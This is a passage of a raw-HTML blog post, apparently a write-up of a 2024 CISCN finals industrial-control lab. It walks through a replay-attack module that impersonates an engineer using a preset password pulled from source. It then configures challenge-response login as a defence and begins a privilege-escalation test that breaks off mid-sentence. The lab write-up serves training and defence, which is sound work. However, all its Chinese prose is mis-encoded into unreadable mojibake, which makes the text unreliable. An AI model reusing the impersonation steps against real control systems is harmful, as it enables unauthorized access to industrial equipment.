punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span><span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span><span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span><span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712204232928.png" alt="image-20240712204232928"></p><hr><h3 id="èº«ä»½è®¤è¯å®‰å…¨æµ‹è¯•"><a href="#èº«ä»½è®¤è¯å®‰å…¨æµ‹è¯•" class="headerlink" title="èº«ä»½è®¤è¯å®‰å…¨æµ‹è¯•"></a>èº«ä»½è®¤è¯å®‰å…¨æµ‹è¯•</h3><h4 id="ä¸­é—´äººæ”»å‡»"><a href="#ä¸­é—´äººæ”»å‡»" class="headerlink" title="ä¸­é—´äººæ”»å‡»"></a>ä¸­é—´äººæ”»å‡»</h4><blockquote><p>ç³»ç»Ÿåœ¨å·¥ç¨‹å¸ˆç«™engineer_stationå’Œç®¡ç†ä¸­å¿ƒcenterä¹‹é—´æ’å…¥äº†ä¸€ä¸ª<code>login_hacker</code><strong>å®ä¾‹</strong>ï¼Œç”¨è¯¥å®ä¾‹æ¥æ¨¡æ‹Ÿæ”»å‡»è¡Œä¸ºã€‚å½“å‰å®ä¾‹ä¸­ä½¿ç”¨äº†ä¸€ä¸ª<code>echo_plugin</code><strong>æ¨¡å—</strong>ï¼Œè¯¥æ¨¡å—åªæ˜¯ç®€å•åœ°è½¬å‘æ”¶åˆ°çš„æ¶ˆæ¯ï¼Œä¸ä¼šäº§ç”Ÿæ”»å‡»è¡Œä¸ºã€‚</p></blockquote><blockquote><p>æŸæ”»å‡»è€…å¼€å‘äº†ä¸€ä¸ª<strong>é‡æ”¾æ”»å‡»æ¨¡å—</strong><code>login_hacker</code>,è¯¥æ¨¡å—å¯ä»¥<strong>è®°å½•ç™»å½•ç”¨æˆ·çš„åç§°ä¸æ‰€ä½¿ç”¨çš„è®¤è¯å£ä»¤</strong>ï¼Œå¦‚æœæ”»å‡»è€…ä½¿ç”¨ç™»å½•è¿‡çš„ç”¨æˆ·åè¿›è¡Œç™»å½•ï¼Œå¹¶ä¸”åœ¨å£ä»¤å¤„ä½¿ç”¨æ”»å‡»è€…é¢„è®¾çš„å£ä»¤ï¼Œåˆ™æ¨¡å—å°†è‡ªåŠ¨ä½¿ç”¨ä»¥å‰è®°å½•çš„å£ä»¤è¿›è¡Œç™»å½•ã€‚</p></blockquote><blockquote><p>è¯·ç”¨login_hackeræ¨¡å—æ›¿æ¢echo_pluginæ¨¡å—ï¼Œå¹¶ä¸”æ­£ç¡®å¡«å†™å·¥ç¨‹å¸ˆç”¨æˆ·ç›®å½•ä¸‹çš„engineer_login_nopass.msgï¼Œä½¿æ”»å‡»è€…å¯ä»¥åœ¨æ²¡æœ‰å·¥ç¨‹å¸ˆç”¨æˆ·å£ä»¤çš„æƒ…å†µä¸‹åœ¨å·¥ç¨‹å¸ˆç«™ä»¿å†’å·¥ç¨‹å¸ˆè¿›è¡Œç™»å½•ã€‚</p></blockquote><p>cubeæ¶æ„çš„å®ä¾‹å°†å‡†å¤‡ä½¿ç”¨çš„æ¨¡å—åˆ—åœ¨plugin_config.cfgæ–‡ä»¶ä¸­ï¼Œæ¯ä¸ªé€‰ç”¨çš„æ¨¡å—éƒ½æœ‰ä¸¤ä¸ªåå­—ï¼š</p><ul><li><p>nameè¡¨ç¤ºå®ä¾‹ä¸­è¯¥æ¨¡å—çš„åç§°ï¼Œåœ¨å®šä¹‰è·¯ç”±æ—¶ä½¿ç”¨è¿™ä¸ªåå­—ï¼Œè¿™ä¸ªåå­—ä¸€èˆ¬ä¸æ¨¡å—åœ¨å®ä¾‹ä¸­çš„ä½¿ç”¨æ–¹å¼ç›¸å…³ã€‚</p></li><li><p>libnameåˆ™æ˜¯è¯¥æ¨¡å—å¼€å‘æ—¶ä½¿ç”¨çš„åå­—ï¼Œè¿™ä¸ªåå­—ä¸€èˆ¬è¡¨ç°äº†å¼€å‘è€…å¯¹å…¶çš„å®šä½ã€‚è¿™é‡Œ<code>echo_plugin</code>å’Œ<code>login_hacker</code>éƒ½æ˜¯libname</p></li></ul><p>å› ä¸º<code>task_1_2.sh</code>ä¸­çš„è¿è¡Œå‘½ä»¤ä¸ºï¼š<code>yes | cp -a instance/login_hacker/plugin_config.cfg.task_1_2 instance/login_hacker/plugin_config.cfg </code>ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹ plugin_config.cfg.task_1_2 çš„ libname å³å¯</p><p>ä¿®æ”¹åçš„plugin_config.cfg.task_1_2ï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login_hacker"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"login_hacker"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br><blockquote><p>login_hackeræ¨¡å—çš„æºç åœ¨ 2024buildup&#x2F;src&#x2F;security ä¸‹é¢çš„æŸä¸ªåŒåç›®å½•ä¸­ï¼Œä»¥cè¯­è¨€ç¼–å†™ï¼Œé˜…è¯»å…¶æºç ï¼Œå¯ä»¥æ‰¾åˆ°æ‰€ç”¨çš„é¢„è®¾å£ä»¤</p></blockquote><p>src&#x2F;security&#x2F;login_hacker&#x2F;login_hacker.c</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712164109641.png" alt="image-20240712164109641"></p><p>å¯çŸ¥å£ä»¤åœ¨è¿™é‡Œæ˜¯<code>static char security_pass[32] = &quot;Tclab2024&quot;;</code>ï¼Œå³<code>Tclab2024</code></p><p>æ‹¿åˆ°å£ä»¤ä¹‹åï¼Œä¿®æ”¹ instance&#x2F;engineer&#x2F;user&#x2F;engineer_login_nopass.msgï¼Œåœ¨å£ä»¤å¤„ä½¿ç”¨æ”»å‡»è€…é¢„è®¾çš„å£ä»¤</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"zhao:Tclab2024"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>éªŒè¯ï¼š</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712170232030.png" alt="image-20240712170232030"></p><p>å¯ä»¥çœ‹åˆ°ç¬¬äºŒæ¬¡çš„æ—¶å€™æˆåŠŸç™»å½•</p><br><p>æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥é¡ºä¾¿äº†è§£ä¸‹cubeæ¶æ„ä¸­æ¨¡å—çš„é€»è¾‘ã€‚cubeæ¶æ„çš„æ¨¡å—å…¶ç»“æ„æ¯”è¾ƒæ¸…æ™°ï¼š</p><ul><li><p>ä¸€èˆ¬ç”¨<code>ä¸€ä¸ªæ¨¡å—å+initçš„å‡½æ•°ï¼ˆç§°ä¸ºæ¨¡å—çš„initå‡½æ•°ï¼‰</code>è¿›è¡Œæ¨¡å—è½½å…¥æ—¶çš„<strong>åˆå§‹åŒ–æ“ä½œ</strong></p></li><li><p>ç”¨<code>ä¸€ä¸ªæ¨¡å—å+startçš„å‡½æ•°ï¼ˆç§°ä¸ºæ¨¡å—çš„startå‡½æ•°ï¼‰</code>ä½œä¸ºæ¨¡å—çš„<strong>ä¸»ä½“</strong>ï¼ŒæŒç»­è¿›è¡Œå¾ªç¯ï¼Œæ¯æ¬¡å¾ªç¯æ£€æŸ¥æ¨¡å—æ¥æ”¶åˆ°çš„æ¶ˆæ¯å¹¶è¿›è¡Œå¤„ç†ã€‚</p><p>startå‡½æ•°æ ¹æ®æ¶ˆæ¯çš„æ ¼å¼åˆ†æµæ¶ˆæ¯ï¼Œè®©æ¯ç§æ¶ˆæ¯è°ƒç”¨è‡ªå·±çš„ä¸“ç”¨æ“ä½œå‡½æ•°ã€‚å¦‚æœæ¨¡å—çš„å‡ ä¸ªå¤„ç†æµç¨‹å…±ç”¨åŒä¸€ç§æ¶ˆæ¯æ ¼å¼ï¼Œåˆ™ä¸€èˆ¬åœ¨æ¶ˆæ¯å¤„ç†å‡½æ•°ä¸­è·å–æ¶ˆæ¯åï¼Œå†æ ¹æ®æ¶ˆæ¯å†…å®¹è¿›è¡Œç¬¬äºŒæ¬¡åˆ†æµï¼Œä¸€èˆ¬è€Œè¨€ï¼Œæ¯ä¸ªæµç¨‹éƒ½æœ‰è‡ªå·±ä¸“é—¨çš„å¤„ç†å‡½æ•°</p></li></ul><hr><h4 id="æŒ‘æˆ˜-åº”ç­”æœºåˆ¶"><a href="#æŒ‘æˆ˜-åº”ç­”æœºåˆ¶" class="headerlink" title="æŒ‘æˆ˜-åº”ç­”æœºåˆ¶"></a>æŒ‘æˆ˜-åº”ç­”æœºåˆ¶</h4><blockquote><p>ä¸ºäº†é˜²èŒƒä¸­é—´äººæ”»å‡»ï¼Œæˆ‘ä»¬å‡†å¤‡ç”¨æŒ‘æˆ˜-åº”ç­”æœºåˆ¶æ¥æ›¿æ¢æ‰å½“å‰ä½¿ç”¨çš„å£ä»¤å­—ç¬¦ä¸²å“ˆå¸Œçš„è®¤è¯æœºåˆ¶ã€‚å½“å‰ä½¿ç”¨çš„ç”¨æˆ·ç«¯ç™»å½•å¤„ç†æ¨¡å—<code>login_user</code>å’ŒæœåŠ¡ç«¯ç™»å½•å¤„ç†æ¨¡å—<code>login_server</code>æœ¬èº«å°±å…·å¤‡äº†æ”¯æŒæŒ‘æˆ˜-åº”ç­”æœºåˆ¶çš„èƒ½åŠ›ã€‚è¯·æ­£ç¡®é…ç½®å‚æ•°å’Œè·¯ç”±ï¼Œå®ç°æŒ‘æˆ˜-åº”ç­”æœºåˆ¶ï¼Œä»¥é˜²èŒƒé‡æ”¾æ”»å‡»è¡Œä¸º</p></blockquote><p>åœ¨ plugin_config.cfg ä¸­å®šä¹‰æ¨¡å—æ—¶ï¼Œå¯ä»¥ä½¿ç”¨<code>init_para</code>å‚æ•°æ¥ä¸ºæ¨¡å—æä¾›ä¸€äº›é…ç½®ä¿¡æ¯</p><p>é…ç½®ä¿¡æ¯çš„å®šä¹‰ä¸€èˆ¬åœ¨æ¨¡å—çš„å®šä¹‰æ–‡ä»¶cfgä¸­ã€‚å¦‚ login_user.cfg ä¸­ç»™å‡ºäº†<code>init_para_desc</code>çš„å®šä¹‰ï¼Œå®šä¹‰ä¸­ç”¨modeå€¼æ¥è¡¨ç¤ºæ¨¡å—é‡‡ç”¨å“ªä¸€ç§ç™»å½•æœºåˆ¶ã€‚</p><p>plugin&#x2F;login_user.cfg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"MONITOR"</span><span class="token punctuation">,</span><span class="token property">"dynamic_lib"</span><span class="token operator">:</span><span class="token string">"liblogin_user.so"</span><span class="token punctuation">,</span><span class="token property">"init"</span><span class="token operator">:</span><span class="token string">"login_user_init"</span><span class="token punctuation">,</span><span class="token property">"start"</span><span class="token operator">:</span><span class="token string">"login_user_start"</span><span class="token punctuation">,</span><span class="token property">"init_para_desc"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"elem_no"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"elem_desc"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"mode"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pluginæ¨¡å—å®šä¹‰æ—¶ï¼Œå¯ä»¥ç”¨<code>&quot;init_para&quot;:&#123;&quot;mode&quot;:1&#125;</code>æ¥è¡¨ç¤ºæ¨¡å—é€‰æ‹©äº†æ¨¡å¼1</p><blockquote><p>è¯·é€šè¿‡é˜…è¯»æºç ç¡®å®šå“ªç§æ¨¡å¼æ˜¯æŒ‘æˆ˜åº”ç­”æ¨¡å¼ï¼Œå¹¶åœ¨plugin_config.cfgä¸­æ­£ç¡®é…ç½®</p></blockquote><p>ç›´æ¥å…¨å±€æœç´¢æ‰¾åˆ°ç›¸å…³çš„ä»£ç </p><p>src&#x2F;system&#x2F;login_user&#x2F;login_user.c</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712174924813.png" alt="image-20240712174924813"></p><p>å¯çŸ¥æ˜¯æ¨¡å¼2ï¼Œé‚£ä¹ˆplugin_config.cfg.task_1_3ï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"msg_send"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"msgfile_send"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"msg_print"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"msgrecord_print"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"file_dealer"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"file_dealer"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>        <span class="token property">"init_para"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                <span class="token property">"mode"</span><span class="token operator">:</span><span class="token number">2</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"logic_upload"</span><span class="token punctuation">,</span>        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"logic_upload"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><blockquote><p>æŒ‘æˆ˜-åº”ç­”æœºåˆ¶ä¸­ï¼Œç”¨æˆ·å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼šè¿›è¡Œ<strong>ä¸¤æ¬¡äº¤äº’</strong>ï¼Œè€Œæ—§çš„æ¶ˆæ¯è·¯ç”±åªæä¾›äº†ä¸€æ¬¡äº¤äº’æµç¨‹ï¼Œéœ€è¦é‡æ–°é…ç½®è®¤è¯æµç¨‹</p></blockquote><p>æ—§çš„èº«ä»½è®¤è¯æµç¨‹æ˜¯ç”¨loginè·¯ç”±æ¥è®¤è¯çš„ï¼Œå®ƒç”±engineer&#x2F;userï¼Œengineer&#x2F;stationå’Œmonitor_centerä¸­å®šä¹‰çš„loginè·¯ç”±ç›¸äº’è¿æ¥è€Œå½¢æˆï¼Œç±»å‹ä¸ºQUERYï¼Œè¡¨ç¤ºè¯¥è·¯ç”±ä¸ºç™»å½•åè¿”å›çš„è¿‡ç¨‹ã€‚</p><p>è€Œåœ¨æ”¯æŒæŒ‘æˆ˜-åº”ç­”æœºåˆ¶æ—¶ï¼Œ<strong>login_useråœ¨æ”¶åˆ°è¿”å›æ¶ˆæ¯åï¼Œä¼šç”ŸæˆçŠ¶æ€ä¸ºCHALLENGEæ ¼å¼çš„ç™»å½•æ¶ˆæ¯ï¼Œè¿™ä¸ªæ¶ˆæ¯å°†å†æ¬¡å‘é€åˆ°serverç«¯å¹¶å®Œæˆç™»å½•è¡Œä¸º</strong>ã€‚</p><p>æˆ‘ä»¬æŠŠå·¥ç¨‹å¸ˆç«™login_useræ”¶åˆ°ç”¨æˆ·ç™»å½•æ¶ˆæ¯åï¼Œå‘é€æ¶ˆæ¯ç»™ç®¡ç†ä¸­å¿ƒlogin_serverï¼Œå¹¶è·å¾—æŒ‘æˆ˜ä¿¡æ¯çš„è¿‡ç¨‹çœ‹åšæ˜¯æ’å…¥åˆ°åŸæœ‰ç™»å½•è¿‡ç¨‹ä¸­çš„æ–°è¿‡ç¨‹ï¼Œå°±å¯ä»¥ä½¿ç”¨cubeæ¶æ„ä¸­çš„<strong>åˆ‡é¢è·¯ç”±æœºåˆ¶</strong>ã€‚</p><p>è¿™ä¸ªæœºåˆ¶å®šä¹‰çš„è·¯ç”±ä¸€èˆ¬æ”¾åœ¨aspect_policy.cfgä¸­ï¼Œé€‰é¡¹å¯å®šä¸ºASPECTï¼Œæ˜¯æŒ‡åœ¨åŸè·¯ç”±ä¸­æ’å…¥äº†ä¸€æ®µå¤„ç†è¿‡ç¨‹ï¼Œå¤„ç†è¿‡ç¨‹å®Œæˆåå›åˆ°åŸæœ¬è·¯ç”±ã€‚ ç”¨è·¯ç”±å›¾æ¥æè¿°åˆ™å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/%E5%9B%BE%E7%89%871.png" alt="å›¾ç‰‡1"></p><p>åˆ‡é¢è·¯ç”±å°†æœ‰è‡ªå·±çš„æ–°åç§°ï¼Œè¿™é‡Œæˆ‘ä»¬å°†æ–°çš„åˆ‡é¢è·¯ç”±å‘½åä¸º challenge_loginï¼Œåœ¨ç®¡ç†ä¸­å¿ƒçš„è·¯ç”±é…ç½®æ–‡ä»¶ä¸­å®šä¹‰ï¼Œå¯ä»¥æŠŠå®ƒå½“ä½œæ˜¯ç”±åˆ‡å…¥ç‚¹å¼€å§‹çš„QUERYæ ¼å¼è·¯ç”±ï¼ˆè¯¢é—®æ¨¡å¼ï¼Œå‘å‡ºæ¶ˆæ¯æŠµè¾¾ç›®æ ‡ååŸè·¯è¿”å›)ï¼Œæœ€ç»ˆå›åˆ°åˆ‡å…¥ç‚¹ï¼Œå†é‡æ–°æ‰§è¡ŒåŸæµç¨‹ã€‚</p><p>instance&#x2F;engineer&#x2F;station&#x2F;aspect_policy.cfg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"policy_head"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>       <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"ASPECT"</span><span class="token punctuation">,</span>        <span class="token property">"sender"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span><span class="token property">"ljump"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token property">"rjump"</span><span class="token operator">:</span><span class="token number">-2</span><span class="token punctuation">,</span><span class="token property">"newname"</span><span class="token operator">:</span><span class="token string">"challenge_login"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"MATCH_RULES"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"op"</span><span class="token operator">:</span><span class="token string">"AND"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"USER_DEFINE"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIN"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"ROUTE_RULES"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"main_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"CONN"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"center_client"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">]</span>        <span class="token property">"response_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>policy_head</code>ï¼šæ‹¦æˆªä½ç½®</p></li><li><p><code>name</code>ï¼šè¢«æ‹¦æˆªè·¯ç”±</p></li><li><p><code>type</code>æœ‰ä¸¤ç§å–å€¼ï¼š</p><p>å¤åˆ¶ï¼ˆ<code>DUP</code>ï¼‰è¡¨ç¤ºä»åŸè·¯ç”±å¤åˆ¶ä¿¡æ¯ï¼Œä¸æ”¹å˜åŸè·¯ç”±ä¼ è¾“æ–¹å¼</p><p>æ‹¦æˆªï¼ˆ<code>ASPECT</code>ï¼‰åˆ™æ˜¯è®©åŸè·¯ç”±è½¬å»æ–°è·¯ç”±è¿›è¡Œå¤„ç†ï¼Œå®Œæˆå¤„ç†åæ— å¼‚å¸¸æƒ…å†µåˆ™è¿”å›åŸè·¯ç”±é€”å¾„</p></li><li><p><code>ljump</code>è¡¨ç¤ºæ˜¯åœ¨æœ¬åœ°è·¯ç”±çš„ç¬¬å‡ è·³ï¼ˆç”Ÿæˆ&#x2F;æ”¶åˆ°æ¶ˆæ¯ä¸ºç¬¬1è·³ï¼Œç»è¿‡ä¸€ä¸ªæ¨¡å—å¢åŠ 1è·³ï¼Œ<code>sender</code>è¡¨ç¤ºè·¯ç”±çš„å‘é€è€…ï¼Œè¿™ä¸¤ä¸ªå…±åŒå®šä¹‰äº†è·¯ç”±çš„èµ·å§‹ä½ç½®ã€‚<code>rjump</code>æ˜¯ä¸€ä¸ªå‡†å¤‡è¢«åºŸå¼ƒæˆ–æ›¿ä»£çš„å‚æ•°ï¼Œåœ¨è¿™é‡Œçš„å”¯ä¸€ä½œç”¨æ˜¯ç”¨è´Ÿå€¼è¡¨ç¤ºæ‹¦æˆªçš„æ˜¯è¿”å›ä¿¡æ¯ã€‚</p></li><li><p><code>newname</code>åˆ™è¡¨ç¤ºå¤åˆ¶æˆ–æ‹¦æˆªè·¯ç”±æ‰€åœ¨çš„æ–°è·¯ç”±åç§°ï¼Œè¿™é‡Œå¤åˆ¶è·¯ç”±ä¸Šçš„æ¶ˆæ¯å°†æ²¿ç€æ–°è·¯ç”±ä¼ æ’­ï¼Œè€Œæ‹¦æˆªè·¯ç”±ä¸Šçš„æ¶ˆæ¯åˆ™åœ¨å®Œæˆæ–°è·¯ç”±å¹¶è¿”å›åï¼Œé‡æ–°è¿›å…¥åŸè·¯ç”±ï¼Œæ²¿ç€æ‹¦æˆªç‚¹ç»§ç»­ä¼ æ’­ã€‚</p></li><li><p><code>MATCH_RULES</code>ä¸­çš„å†…å®¹è¡¨ç¤ºåˆ‡é¢è§¦å‘æ—¶æ¶ˆæ¯è¦æ»¡è¶³çš„æ¡ä»¶ï¼Œ<code>ROUTE_RULES</code>åˆ™æŒ‡æ¶ˆæ¯åœ¨æ–°è·¯ç”±ä¸­ä¼ æ’­çš„è·¯å¾„ã€‚è¿™é‡Œçš„è·¯ç”±å¯ä»¥æŒ‡å‘å…¶å®ƒå®ä¾‹ï¼Œåœ¨å…¶å®ƒå®ä¾‹ä¸­ä¸å…¶å¯¹æ¥çš„è·¯ç”±åº”å½“æ˜¯ä¸æ–°è·¯ç”±åç§°ä¸€è‡´çš„DELIVERæ ¼å¼è·¯ç”±ï¼ˆä¸DUPæ ¼å¼åˆ‡é¢è·¯ç”±å¯¹æ¥ï¼‰æˆ–QUERYæ ¼å¼è·¯ç”±ï¼ˆä¸ASPECTæ ¼å¼è·¯ç”±å¯¹æ¥ï¼‰ã€‚</p></li></ul><p>aspect_policy.cfg.task_1_3ï¼šç›´æ¥å¤åˆ¶<code>./instance/engineer/station/plugin_config.cfg</code>æ–‡ä»¶çš„å†…å®¹å°±è¡Œï¼Œæ‹¦æˆª-è½¬å‘é€»è¾‘æ˜¯é¢„å…ˆå†™å¥½çš„</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712191107681.png" alt="image-20240712191107681"></p><hr><h2 id="æ”»å‡»æ¨¡æ‹Ÿä»»åŠ¡"><a href="#æ”»å‡»æ¨¡æ‹Ÿä»»åŠ¡" class="headerlink" title="æ”»å‡»æ¨¡æ‹Ÿä»»åŠ¡"></a>æ”»å‡»æ¨¡æ‹Ÿä»»åŠ¡</h2><h3 id="è¶Šæƒè®¿é—®"><a href="#è¶Šæƒè®¿é—®" class="headerlink" title="è¶Šæƒè®¿é—®"></a>è¶Šæƒè®¿é—®</h3><p>æœ¬è¿‡ç¨‹ç”±ç”¨æˆ·æµ‹è¯•ç³»ç»Ÿä¸­å¯ä»¥è¿›è¡Œè¶Šæƒè®¿é—®çš„ä½ç½®</p><p>æœ¬ç³»ç»Ÿä¸­ï¼Œå·¥ç¨‹å¸ˆã€æ“ä½œå‘˜å’Œç³»ç»Ÿç›‘è§†å‘˜é™¤å¯æ‰§è¡Œè§„å®šå…è®¸çš„æ“ä½œå¤–ï¼Œè¿˜æœ‰å¦‚ä¸‹é™åˆ¶ï¼š</p><ol><li>å·¥ç¨‹å¸ˆå¯ä»¥ç™»å½•æ“ä½œå‘˜ç«™å’Œç®¡ç†ç»ˆç«¯ï¼Œä½†åªèƒ½è§‚å¯Ÿæ•°æ®ï¼Œä¸èƒ½æ‰§è¡Œè°ƒèŠ‚æ¸©åº¦ç­‰æ§åˆ¶è¡Œä¸ºã€‚</li><li>æ“ä½œå‘˜å¯ä»¥ç™»å½•ç®¡ç†ç»ˆç«¯ï¼Œä½†åªèƒ½è§‚å¯Ÿæ•°æ®ï¼Œä¸èƒ½åœ¨ç›‘è§†ç»ˆç«¯æ‰§è¡Œè°ƒèŠ‚æ¸©åº¦ç­‰æ§åˆ¶è¡Œä¸ºã€‚</li><li>ç›‘è§†å‘˜å¯ä»¥ç™»å½•æ“ä½œå‘˜ç«™ï¼Œä½†åªèƒ½è§‚å¯Ÿæ•°æ®ï¼Œä¸èƒ½åœ¨ç›‘è§†ç»ˆç«¯æ‰§è¡Œè°ƒèŠ‚æ¸©åº¦ç­‰æ§åˆ¶è¡Œä¸ºã€‚</li><li>æ“ä½œå‘˜å’Œç›‘è§†å‘˜å‡å¯ç™»å½•å·¥ç¨‹å¸ˆç«™ï¼Œä½†ä¸èƒ½æ‰§è¡Œä»£ç ä¸Šä¼ å’Œé€»è¾‘ä¸Šä¼ å‘½ä»¤ã€‚</li></ol><blockquote><p>è¯·åœ¨å·¥ç¨‹å¸ˆç«™ã€æ“ä½œå‘˜ç«™å’Œç›‘è§†ç»ˆç«¯è¿›è¡Œæµ‹è¯•ï¼Œæ‰¾åˆ°å¯ä»¥è¿è§„æ“ä½œçš„ç‚¹</p></blockquote><p>æ§åˆ¶è¡Œä¸ºç”¨è°ƒèŠ‚æ¸©åº¦åˆ°39åº¦ä»£è¡¨ï¼Œå‚è€ƒæ“ä½œå‘˜ç”¨æˆ·ç›®å½•ä¸‹çš„plc_set_t.msg</p><p>ä¸Šä¼ å‘½ä»¤åˆ™ç”¨ä»£ç ä¸Šä¼ 